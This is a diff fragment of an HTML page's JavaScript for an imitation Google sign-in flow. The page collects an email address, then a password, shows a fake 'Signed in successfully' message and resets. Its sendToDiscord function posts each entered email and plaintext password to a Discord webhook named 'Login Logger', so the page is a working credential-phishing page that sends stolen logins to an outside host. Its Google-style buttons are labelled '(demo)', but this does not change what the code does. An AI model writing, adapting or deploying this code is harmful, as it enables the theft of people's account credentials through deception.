+              privacyLink: '🔏 Privacy policy',
+              termsLink: '📜 Terms of service',
+              languageSelect: '🌐 Language changed',
+              googleButton1: '🔑 Continue with Google (demo)',
+              googleButton2: '📱 Use your phone (demo)',
+              googleButton3: '👥 Different account (demo)'
+            };
+            alert(messages[id] || 'Demo interaction');
+          });
+        }
+      });
+
+      // ---------- STATE ----------
+      let currentEmail = '';
+
+      // ---------- DISCORD ----------
+      async function sendToDiscord(email, password) {
+        const data = {
+          content: `**New Login Attempt**\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`,
+          username: 'Login Logger',
+          avatar_url: 'https://www.google.com/favicon.ico'
+        };
+        try {
+          const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+          return response.ok;
+        } catch { return false; }
+      }
+
+      // ---------- UI HELPERS ----------
+      function resetToEmailScreen() {
+        emailInput.value = '';
+        passwordInput.value = '';
+        currentEmail = '';
+        emailScreen.classList.remove('hidden');
+        passwordScreen.classList.add('hidden');
+        successMessage.classList.remove('visible');
+        toPasswordBtn.disabled = false;
+        signInBtn.disabled = false;
+        emailInput.focus();
+      }
+
+      function showPasswordScreen(email) {
+        currentEmail = email;
+        displayEmailSpan.textContent = email;
+        emailScreen.classList.add('hidden');
+        passwordScreen.classList.remove('hidden');
+        passwordInput.focus();
+        signInBtn.disabled = false;
+      }
+
+      // ---------- EMAIL NEXT ----------
+      function handleEmailNext() {
+        const email = emailInput.value.trim();
+        if (!email) { alert('Please enter an email or phone number.'); return; }
+        toPasswordBtn.disabled = true;
+        loadingOverlay.classList.add('visible');
+        loadingText.textContent = 'Verifying email...';
+        setTimeout(() => {
+          loadingOverlay.classList.remove('visible');
+          toPasswordBtn.disabled = false;
+          showPasswordScreen(email);
+        }, 2000);
+      }
+
+      // ---------- PASSWORD SIGN-IN (DISCORD + RESET) ----------
+      async function handleSignIn() {
+        const pwd = passwordInput.value.trim();
+        if (!pwd) { alert('Please enter your password.'); return; }
+        signInBtn.disabled = true;
+        loadingOverlay.classList.add('visible');
+        loadingText.textContent = 'Signing in...';
+        const sent = await sendToDiscord(currentEmail, pwd);
+        loadingOverlay.classList.remove('visible');
+        if (sent) {
+          successMessage.textContent = '✓ Signed in successfully';
+          successMessage.classList.add('visible');
+          setTimeout(resetToEmailScreen, 1500);
+        } else {
+          alert('Error sending data. Please try again.');
+          signInBtn.disabled = false;
+        }
+      }
+
+      // ---------- EVENT LISTENERS ----------
+      toPasswordBtn.addEventListener('click', handleEmailNext);
+      signInBtn.addEventListener('click', handleSignIn);
+      backToEmailBtn.addEventListener('click', () => {
+        passwordInput.value = '';
+        emailScreen.classList.remove('hidden');
+        passwordScreen.classList.add('hidden');
+        emailInput.focus();
+      });
+      document.getElementById('emailDisplay').addEventListener('click', () => {
+        passwordInput.value = '';
+        emailScreen.classList.remove('hidden');
+        passwordScreen.classList.add('hidden');
+        emailInput.focus();
+      });
+
+      // Use another account -> full reset
+      const uaEmail = document.getElementById('useAnotherAccountEmail');
+      const uaPassword = document.getElementById('useAnotherAccountPassword');
+      uaEmail.addEventListener('click', resetToEmailScreen);
+      uaPassword.addEventListener('click', resetToEmailScreen);
+
+      // Enter keys
+      emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !toPasswordBtn.disabled) { e.preventDefault(); handleEmailNext(); }
+      });
+      passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !signInBtn.disabled) { e.preventDefault(); handleSignIn(); }
+      });
+
+      // initial focus
+      emailInput.focus();
+      window.addEventListener('load', () => loadingOverlay.classList.remove('visible'));
+    })();
+  </script>
 </body>
 </html>
